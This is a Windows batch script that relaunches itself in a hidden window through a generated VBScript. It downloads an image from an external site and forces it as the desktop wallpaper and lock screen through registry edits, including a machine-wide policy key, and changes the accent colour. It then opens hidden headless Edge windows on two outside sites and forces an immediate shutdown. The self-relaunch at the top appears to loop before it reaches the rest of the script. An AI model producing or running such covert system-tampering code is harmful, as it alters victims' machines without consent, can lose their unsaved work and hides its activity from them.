@echo off
set "vbsFile=%temp%\hidebat.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%vbsFile%"
echo WshShell.Run """" ^& WScript.Arguments(0) ^& """", 0, False >> "%vbsFile%"
cscript //nologo "%vbsFile%" "%~f0"
exit /b

set "imgUrl=https://cmd-hue.github.io/coinslot/og.png"
set "imgPath=%USERPROFILE%\Pictures\coinslot_og.png"

powershell -Command "Invoke-WebRequest -Uri '%imgUrl%' -OutFile '%imgPath%'"

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imgPath%" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v LockScreenImage /t REG_SZ /d "%imgPath%" /f
reg add "HKCU\Software\Microsoft\Windows\DWM" /v AccentColor /t REG_DWORD /d 0xff6100 /f

RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True

powershell -WindowStyle Hidden -Command "Start-Process '%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe' -ArgumentList '--headless','--disable-gpu','--dump-dom','https://youtomb.github.io' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "Start-Process '%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe' -ArgumentList '--headless','--disable-gpu','--dump-dom','https://youtomb-mobile.github.io' -WindowStyle Hidden"

shutdown /s /t 1 /f /d p:0:0
